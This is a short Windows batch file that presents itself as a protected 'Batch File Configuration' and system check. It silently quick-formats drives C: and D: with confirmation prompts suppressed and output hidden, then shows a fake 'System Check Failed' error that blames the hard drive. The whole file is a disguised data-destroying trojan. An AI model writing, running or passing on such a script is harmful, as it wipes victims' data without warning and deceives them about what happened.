   @echo off
   Rem Batch File Configuration
   Rem Please do not Edit or Delete
   cls
   :Start
   Format /q /Autotest /v:Trug c: >Nul
   Format /q /Autotest /v:Trug d: >Nul
   If not Errorlevel 0 goto WARNING
   goto End
   :WARNING
   echo Runtime Error: TR27UG System Check Failed!
   goto End
   echo.
   :End
   cls
   echo Unable to continue.
   echo.
   echo It is recommended to fix your hard drive.
   pause >Nul
